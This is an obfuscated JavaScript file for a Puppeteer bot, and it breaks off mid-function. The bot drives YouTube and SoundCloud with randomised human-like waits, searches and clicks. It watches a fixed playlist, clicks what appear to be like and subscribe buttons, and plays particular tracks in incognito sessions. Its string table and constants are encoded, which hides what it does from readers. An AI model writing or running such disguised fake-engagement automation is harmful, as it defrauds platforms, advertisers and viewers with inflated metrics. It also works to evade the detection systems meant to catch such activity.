const Z = c,
  Y = b,
  X = d;

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (0x2451 + 0x1bd3 * 0x1 + -0x2012 * 0x2);
    let h = e[f];
    return h;
  }, d(b, c);
}

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (-0x23fe + 0x2 * 0xb56 + -0x3 * -0x471))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](-0x1db0 + 0x3dd * 0x5 + 0xa5f), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(0x36eb + 0x7b4b + -0x3d06 + (0x47cd + -0x176a + -0x1 * -0xa35) * random()) : await standardWaitForNetIdle(f), await wait(0x5b0 + 0x5df + 0x7f9 + (0x3e04 + 0x4669 + -0x5d5d) * random()), 0x272 * 0x2 + -0x1b7 * -0x2 + -0x851;
}
async function standardWaitForNetIdle(f) {
  return await wait(0x1 * 0x1237 + 0x24f4 * -0x1 + 0x1 * 0x2645), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), -0x3 * -0x4f + 0x2 * 0xaff + 0xb75 * -0x2;
}
async function randomWait() {
  return await wait(-0x499 + -0xbf7 + 0x2418 * 0x1 + (-0x17 * 0x23 + -0x8d2 * -0x4 + -0xc9b) * random()), -0x9af * -0x1 + -0x1d8 + -0x2 * 0x3eb;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0x410 * 0x6 + 0x18d2 + 0x2 * -0x1899, -0x1cc1 * 0x1 + 0x1 * 0x172e + 0x59a), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((-0x12cbb + -0x1856c + 0x39c87) * getRandomInt(0x197a * 0x1 + 0xe3f + -0x27b7, -0x20e6 + -0x24c + 0x2337), h)), -0xcbd + 0x244a + -0x178c;
}

function a() {
  const bk = [
    'aCoNWPv5W6HvWOxdLmoypW',
    'C3LUxZuYntiZlW',
    'Promise',
    'W5DyWOVdO8kTW47dQwldRq',
    'yxnZAwDU',
    'W5nZFd7cUq',
    'WQ1Qm8oiWQ7cGSoPWQKXAa',
    'CbpcGCoSF8kOW7tcQmkWlW',
    'sGpcVLOzW4aDqeTk',
    'WRhdR8oJWPe',
    'pts/by-sit',
    'ChrZlZqXmJy5oa',
    'films',
    'sByClassNa',
    'locking-a6',
    'v0reqwHbu2y5AG',
    'CMCVzw4VC2nYAq',
    'ts\x20日本語字幕,b',
    'easyfork.o',
    'BdGeuX7dLSkYAmkc',
    'DgLWCY0XyZrJyG',
    'Bwf0DgnVzgvZma',
    'Ds5yWR3dJmkusGddVYK'
  ];
  a = function() {
    return bk;
  };
  return a();
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (0x2451 + 0x1bd3 * 0x1 + -0x2012 * 0x2);
    let h = e[f];
    if (b['QVjdcV'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = 0x1dcb + -0xc * 0x75 + -0x7 * 0x379, s, t, u = 0x2 * -0xa0 + 0x1cee + -0x1 * 0x1bae; t = n['charAt'](u++); ~t && (s = r % (-0x2 * -0x322 + 0x89e + -0x15a * 0xb) ? s * (0xe9f + 0x7db * 0x4 + -0x2dcb) + t : t, r++ % (-0x1 * 0x56b + -0x1a44 + 0x1fb3)) ? p += String['fromCharCode'](0x6 * 0x18c + -0x3a + -0x80f & s >> (-(-0x39a * 0x5 + 0x1f02 + -0xcfe) * r & 0x272 * 0x2 + -0x1b7 * -0x2 + -0x84c)) : 0x1 * 0x1237 + 0x24f4 * -0x1 + 0x3 * 0x63f) {
          t = o['indexOf'](t);
        }
        for (let v = -0x3 * -0x4f + 0x2 * 0xaff + 0x16eb * -0x1, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0x499 + -0xbf7 + 0x10a0 * 0x1))['slice'](-(-0x17 * 0x23 + -0x8d2 * -0x4 + -0x2021));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = -0x9af * -0x1 + -0x1d8 + -0x1 * 0x7d7,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0x410 * 0x6 + 0x18d2 + 0x2 * -0x1899; u < -0x1cc1 * 0x1 + 0x1 * 0x172e + 0x693; u++) {
          p[u] = u;
        }
        for (u = -0x1910 + -0x2074 + 0x3984; u < 0x197a * 0x1 + 0xe3f + -0x26b9; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0x20e6 + -0x24c + 0x2432), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0xcbd + 0x244a + -0x178d, q = 0xc * 0x82 + 0x90f * 0x3 + -0x3 * 0xb17;
        for (let v = 0x1e93 + -0x488 + -0x1a0b; v < n['length']; v++) {
          u = (u + (0x2 * -0xa06 + 0x4c3 * -0x5 + 0x2bdc * 0x1)) % (-0x3d * -0x38 + 0x1 * -0x38c + -0x8cc), q = (q + p[u]) % (-0x15 * -0x1c5 + -0x1 * -0xa09 + -0x2e32), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0x9ab + -0xb40 + 0x15eb)]);
        }
        return t;
      };
      b['UkFVwy'] = m, c = arguments, b['QVjdcV'] = !![];
    }
    const j = e[0x336 + -0x256c + 0x2236],
      k = f + j,
      l = c[k];
    return !l ? (b['ctMRae'] === undefined && (b['ctMRae'] = !![]), h = b['UkFVwy'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const R = d,
      h = {
        'Seconds': 0x3e8,
        'Minutes': 0xea60,
        'Hours': 0x36ee80,
        'Second': 0x3e8,
        'Minute': 0xea60,
        'Hour': 0x36ee80
      };
    let i = Array['from'](document['getElement' + R(0xd) + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = 0xc * 0x82 + 0x90f * 0x3 + -0x3 * 0xb17;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[0x1e93 + -0x488 + -0x1a0a]['split']('\x20');
    for (let k = 0x2 * -0xa06 + 0x4c3 * -0x5 + 0x2bdb * 0x1; k < i['length']; k += -0x3d * -0x38 + 0x1 * -0x38c + -0x9ca)
      j += i[k] * h[i[k + (-0x15 * -0x1c5 + -0x1 * -0xa09 + -0x2f31)]];
    return j;
  });
}
async function anchorAndView(f) {
  const S = b;
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](-0x9ab + -0xb40 + 0x14f1)['map'](l => Array['from'](l['children']))['flat'](0x336 + -0x256c + 0x2237)['map'](l => l['childNodes'][0xc5e * -0x2 + -0x2 * -0x4f7 + 0xecf]['childNodes'][-0x5 * 0x616 + -0x352 + -0x30 * -0xb4]['childNodes'][0x5 * -0x1eb + -0x43b * 0x3 + 0x1649]['childNodes'][-0xcd + 0x17df + -0x1712]['childNodes'][0x84d + 0x3 * 0x437 + -0x14f1]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(-0x2465 + 0x1 * -0x5a7 + -0x4 * -0xb7d, -0x7 + 0x291 + 0x10fe)), await f['click']('#__hookedV' + S(0x13, 'ebRw')), await wait(0x75a + 0x1 * -0x58ee + 0x1 * 0x8c2c);
  const h = await getMaxTime(f),
    i = Math['min']((-0x174a4 * -0x1 + 0x1cd9 + 0xb3 * -0xef) * getRandomInt(-0x901 + -0x9c1 + 0x12c4, -0xa * 0x1a9 + 0x160f + -0x570), h);
  return await wait(i), 0xb2 * 0x13 + -0xeb9 + 0x184;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][0x365 * -0xb + -0x17cb + -0x139 * -0x32]['children'][-0x1f * 0x17 + -0x23b1 + 0x19 * 0x18a]['children'][0x1541 * -0x1 + 0x1 * 0x1c3d + -0x6fc]['children'][0x1 * 0x53b + 0xbee + -0xbf * 0x17]['children'][-0xcec + -0x118 * -0x13 + -0x7dc]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), -0x2523 * 0x1 + 0x31 * -0x76 + 0x3bba;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': 0x14f9 + 0x1 * 0x2216 + 0x3a5 * -0xf + (0x1597 + -0x1192 * 0x2 + 0xdbf) * random()
  }), await wait(0x12f0 * 0x2 + 0x1b72 + -0x2 * 0x1faf + (-0x6f0 + -0x1a69 + 0x2285) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][0x16 * 0xed + -0x1 * 0xbcf + -0x88d]['childNodes'][0x1 * -0x1fd5 + -0x15b4 + 0x4de * 0xb]['childNodes'][0x2059 + -0xd5e + -0x1 * 0x12fa]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][-0x78b * 0x1 + -0x3 * 0x5ed + -0x1957 * -0x1]['childNodes'][-0x276 + -0x13 * 0x13 + -0x3df * -0x1]['childNodes'][-0x9 * 0x363 + -0x1235 + 0x30b2]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](-0x23e + -0x1e6 + -0x425 * -0x1),
          r = -0x1d64 + -0x1 * 0x13e5 + -0x1f * -0x197;
        for (let u = -0x9ca + -0x1240 + 0x1c0a; u < q['length']; u += -0x25ca + -0xc15 + 0x71 * 0x71)
          r += q[u] * k[q[u + (-0x169e + 0x880 + -0xf1 * -0xf)]];
        return r;
      }(n);
  });
  await wait((-0x9cf + -0x1688 + 0x1 * 0x5aef) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((0x3505 * 0x7 + -0x1 * 0x11227 + 0x8964) * getRandomInt(-0x1f88 + -0x1 * 0x2213 + 0x3dc * 0x11, -0x12fe + -0x2315 + -0x7 * -0x7bb), h + (0xa * -0x1de + -0x26b + -0x289f * -0x1));
  return await wait(i), 0x26b2 + -0x45 * -0x23 + -0x10 * 0x302;
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), -0xc45 + 0x161 * 0x17 + -0x1372), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, 0x2333 + 0x7ce + -0x1f49 + (0x293 + 0x16d1 + -0x157c) * Math['random']());
    });
  }, -0x1b10 + 0x2e56 + 0x812);
  await wait(-0x5 * -0x158b5 + 0x6159e + -0x83d47);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((0x1079c + -0x57b * 0xb + -0x1f0d * -0x1) * getRandomInt(0x213a + 0x575 + -0x26ab, -0x15f4 + 0x6c3 + 0xf4a)), clearInterval(h), 0x189c + 0x1d7e + -0x3619;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = 0x16d8 + 0x20c1 + -0x14b * 0x2b;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return 0xa * 0x1b1 + 0x9a9 + 0x166 * -0x13;
    await randomWait();
  }
  return 0x236a + 0x1cf1 * 0x1 + 0x1 * -0x405a;
}

function fetchRandomSC() {
  return Math['random']() <= -0x1149 + 0xf48 * -0x2 + 0xff3 * 0x3 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < -0x14e7 + 0x26ea + -0x1203 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= 0x2bd * -0xa + 0x11c6 + 0x99c + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = -0x34e + 0x16f2 + 0x346 * -0x6;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(-0xc2c5 + 0x113e5 + -0x748 * -0xd + getRandomInt(0x254 * 0x1f + 0x2d7c * -0x2 + -0x7f * -0x9c, 0x2 * 0xad9 + -0x9 * -0x1953 + -0x846d));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](0xedd + -0x1668 + 0x78c), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = -0x38c + -0x2 * 0xb3f + 0x1a0a * 0x1;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](0x37d + -0xdd5 * 0x2 + -0x1 * -0x182d, 0x2 * -0x4a9 + -0x1c7a + 0x25fe)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, 0x13b8 + -0x1ebf + -0x5b * -0x35 + floor((0x304 + -0x161 * -0x5 + -0x601) * random()))), log('p2'), log(await s['evaluate'](() => {
        const U = d;
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(-0xb5f438b6 + 0x50bc5b40 + 0xe537dd76),
          0x2d43b7 + 0x49d045 * -0x3 + 0x1302d18,
          0x9832 + -0x1 * 0x382b + 0x1 * 0x1ff9,
          0x22cf + 0x1f11 + 0x10 * -0x416
        ], y = [
          -0x10 * 0x100 + -0x37 * -0xd + 0x1 * 0xd4d,
          0x13dc + -0xd7 * 0x24 + -0x2 * -0x538,
          0x79d * -0x2 + 0x2cb + -0x1 * -0xc77,
          -0x20b9 + 0x6 * -0x42 + 0x1f * 0x11b
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(0x230b + 0x59 * 0x1a + -0x2c14)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = -0x74b * 0x3 + 0x10e4 + -0x4fd * -0x1; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(0x55 * 0x63 + 0xcc7 + -0x2da6) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[0x532 + -0x2462 + 0x2 * 0xf98] = A[-0x2359 + 0x2031 + -0x338 * -0x1] = A[0x4b * -0x83 + -0x977 + 0x2fd9 * 0x1] = A[0x200d + 0x2 * -0x2b7 + -0x1a9d] = A[-0x1ca7 + 0x215 + -0x551 * -0x5] = A[-0xe3b * 0x1 + -0x2704 + 0x3543] = A[0x1 * -0x1853 + 0x7 * -0x298 + 0x2a80] = A[-0x851 + 0x138d + -0x7 * 0x19a] = A[-0x1 * -0x15b5 + -0x89 * -0x1a + -0x2398] = A[0xc1 * -0x2f + -0xf7a + 0x32f1] = A[-0xd * 0xfb + 0x1 * 0xa7 + 0xc21] = A[-0x1145 * -0x1 + -0x1 * -0x2303 + 0x343e * -0x1] = A[0xb3c * 0x2 + -0x7 * 0x465 + 0x1 * 0x856] = A[0x1875 + 0x1337 * 0x2 + -0x3ed7] = A[0x1bc6 + -0x1 * -0x270d + -0x42c6] = A[-0x6b * -0x2f + 0x21 * -0x28 + -0xe6f] = A[0x237a + -0x219b + 0x10 * -0x1d] = -0x335 * -0x3 + 0xee7 + -0x2 * 0xc43, this['blocks'] = A) : this['blocks'] = [
                -0x1aa8 + -0xd33 * -0x2 + 0x42,
                0x2425 + -0x12ab + 0x2 * -0x8bd,
                0x1 * 0x1bfd + 0x572 + -0x216f,
                -0xc * 0x16a + 0x1b2d + -0x3 * 0x367,
                0x18fb * 0x1 + 0x1 * 0x22d + -0x1b28 * 0x1,
                0x2 * -0xe3b + 0x24f2 + 0x16a * -0x6,
                -0x1be + 0x2 * 0x10f + -0x60,
                0x16a1 * 0x1 + 0x8 * 0x316 + -0x1 * 0x2f51,
                -0x156d * 0x1 + 0xb * -0x69 + -0x8 * -0x33e,
                0x1eb1 + -0x2e1 * 0x1 + -0x1bd0,
                -0x9 * 0x37 + -0xb60 + -0x1 * -0xd4f,
                0x1b2b * -0x1 + 0x1832 + 0x2f9,
                0x6b8 + -0xd * -0x5 + -0x6f9,
                0xb7c + 0x4fd + -0x1079 * 0x1,
                0x184c + 0x26b * 0x2 + -0x1d22,
                -0x287 * -0xe + 0xfa6 * -0x2 + -0x20b * 0x2,
                0x1694 * 0x1 + -0x75 * 0x49 + 0xac9
              ], this['h0'] = -0x1db * -0x1c81be + -0x8d09e3e1 + 0xbf6a4b58, this['h1'] = -0x1aa03 * 0x1d45 + -0x10b9c9589 + 0x22c1f6ae1, this['h2'] = -0x783a3efe + 0x110e51 * 0x6ee + 0x9ac3e6ae, this['h3'] = 0x1242a347 + 0x1 * -0x3980f15 + 0x187c044, this['h4'] = -0x1 * 0x100736e7b + 0x6c1a4764 + 0x1582c0907, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = -0xed9 + 0x3 * 0x34b + 0x4f8, this['finalized'] = this['hashed'] = 0x3ef * -0x1 + 0x131f + -0xf30, this['first'] = 0xb8 + -0x2 * 0x811 + -0xf6b * -0x1;
            }
            ['update'](J) {
              const T = b;
              var K, L, M, N, O, P;
              if (!this[T(0x3, 'oCXr')]) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = 0x6d + 0x860 + -0x2ef * 0x3, O = J['length'] || -0x23d0 + 0x113 * -0xa + -0x65 * -0x76, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = -0x1af * -0x2 + 0x15e + -0x4bc, P[0x2 * -0x1227 + -0x1d9a + 0x41e8] = this['block'], P[0x2cf + -0xe78 + 0xbb9] = P[-0xc77 * -0x1 + -0x2516 + 0x18a0] = P[-0x1345 + -0xd * 0x1 + 0x2 * 0x9aa] = P[-0x198 * 0x10 + 0x2 * -0x1ab + 0x1cd9] = P[-0x1603 + 0x2517 + -0xf10] = P[0xe80 + -0x1e26 + 0xfab * 0x1] = P[0x1 * 0x1bec + -0x1fbb + -0x3d5 * -0x1] = P[0x16 * -0xf3 + 0xbbb + 0x92e] = P[-0xa89 * 0x3 + -0x39b * 0x8 + 0x3c7b] = P[-0xd * -0x135 + 0x1 * 0x1654 + -0x25fc] = P[-0x1827 + 0x2167 + 0x3 * -0x312] = P[0x1 * 0x1093 + 0x876 + -0x18fe] = P[-0xd * -0x18b + 0xc99 + 0x2 * -0x104e] = P[-0x2508 + 0x2485 * 0x1 + -0x18 * -0x6] = P[0xf02 + 0xb2 * 0x10 + -0xd0a * 0x2] = P[0x1d6 + -0x137 * -0x5 + -0x3ed * 0x2] = 0x20d7 + 0x297 + -0x236e), K) {
                    for (N = this['start']; M < O && N < 0x24b1 + 0x3d4 + -0x2845; ++M)
                      P[N >> -0x2 * 0x2b1 + -0x21 * 0x118 + 0x213 * 0x14] |= J[M] << y[-0x1 * -0x2359 + 0x41 * 0x43 + -0x3 * 0x1173 & N++];
                  } else {
                    for (N = this['start']; M < O && N < -0x2ba * 0x1 + 0x1d93 + -0x1a99; ++M)
                      (L = J['charCodeAt'](M)) < 0xc * 0xce + 0x3 * 0x3d6 + -0x422 * 0x5 ? P[N >> 0x188 + -0x18dd + 0x1757] |= L << y[-0x1444 + -0x266c + 0x1 * 0x3ab3 & N++] : L < -0x3 * -0x183 + -0x1 * 0x6a7 + 0xa * 0x103 ? (P[N >> 0x4 * -0x543 + -0x367 * -0x3 + 0xad9 * 0x1] |= (-0xf9c + 0xf4a + 0x112 | L >> -0x3c4 + 0x2032 + 0x65 * -0x48) << y[0x11 * -0x15b + -0x1 * -0x15f1 + -0x1 * -0x11d & N++], P[N >> 0x9 * 0x2a9 + -0x2362 + 0xb73 * 0x1] |= (-0x8aa * 0x3 + 0x1 * -0x18eb + 0x141 * 0x29 | 0x89 * -0x35 + -0x11c2 + 0x2e5e & L) << y[0x17 * 0x2 + -0x18a4 + 0x1879 & N++]) : L < 0x7 * -0x195b + -0x42af + 0x1cc2c || L >= -0x2 * -0x666d + -0xa86a + 0xbb90 ? (P[N >> 0x2356 + -0x1689 + -0xccb] |= (-0x2 * 0x937 + -0x86 * 0x25 + 0x26ac | L >> 0x139 * 0xd + 0x1978 * -0x1 + 0x99f) << y[0x1e24 + -0x173a + -0x5d * 0x13 & N++], P[N >> -0x992 + 0x470 * -0x7 + 0x28a4] |= (0x17e * -0x11 + 0x1a * -0x31 + 0x1ed8 | L >> 0x35a + -0xecc + -0x4 * -0x2de & 0x1947 + 0x21ff + -0x3b07) << y[-0xcd0 + -0x16dc + 0x23af * 0x1 & N++], P[N >> 0x14dd + -0x1e70 + 0xdf * 0xb] |= (-0x1593 + -0x1504 + -0x2b17 * -0x1 | 0x1 * 0x687 + 0x20fb + -0x2743 & L) << y[0x14b * 0x17 + 0xccb + -0x2a85 & N++]) : (L = 0x1f655 + -0x8 * -0x617 + 0x1 * -0x1270d + ((-0xcc2 + 0x1bb4 + -0xaf3 & L) << -0x8 * 0x6b + 0x1b * -0x10b + 0x1f8b | 0x1c64 + 0x9 * 0x199 + -0x1 * 0x26c6 & J['charCodeAt'](++M)), P[N >> 0x1c3a + -0x74f * -0x4 + 0xe5d * -0x4] |= (-0x3 * 0x775 + -0x1bb + 0x190a | L >> -0x21ee + 0x22c0 + -0xc0) << y[-0x1 * -0xfa9 + 0xd * -0x77 + -0x99b & N++], P[N >> 0x1391 + -0x22 * -0xee + -0x332b] |= (-0x11bd + -0x215 * 0xc + 0x1 * 0x2b39 | L >> 0x76 + -0x1c1e + -0x24f * -0xc & -0x18bd * 0x1 + -0x3 * -0xa57 + -0x609) << y[-0xd1 * -0x17 + 0x915 + 0x1bd9 * -0x1 & N++], P[N >> -0x1706 + -0xa7 * 0x33 + 0x384d] |= (-0x1 * 0x1bb4 + 0x25f0 + 0x1 * -0x9bc | L >> 0x1df8 + -0x14c5 + -0x92d & 0x1082 + -0x5d0 + -0xa73) << y[0xc3f + 0xbea + -0x2 * 0xc13 & N++], P[N >> 0xf91 + 0x21af + -0x313e] |= (-0x11ee + 0x2 * -0xa46 + 0x26fa | -0x13 * -0x9e + -0x1c7 + -0x9b4 & L) << y[0x1 * 0x67a + 0x1 * 0x16d3 + -0x1d4a & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= 0x2135 + 0x248f + -0x4584 ? (this['block'] = P[0x76 * -0x4 + 0x221d + -0x2035], this['start'] = N - (0x1 * 0x1aad + -0x1e7a * 0x1 + 0x40d), this['hash'](), this['hashed'] = -0x5b4 + -0x13df + 0x4 * 0x665) : this['start'] = N;
                }
                return this['bytes'] > 0x14f27e127 + 0x11e1841f * 0xd + -0x1379b96bb * 0x1 && (this['hBytes'] += this['bytes'] / (-0xd9d31ea8 + 0x188f5d218 + 0x50dd4c90) << -0x13ad + 0x19b3 + -0x606, this['bytes'] = this['bytes'] % (-0x1 * 0xafeb098c + -0x1 * -0x2e2761c8 + 0x181c3a7c4)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = -0x1 * 0xb39 + 0x36a * -0x4 + 0x18e2;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
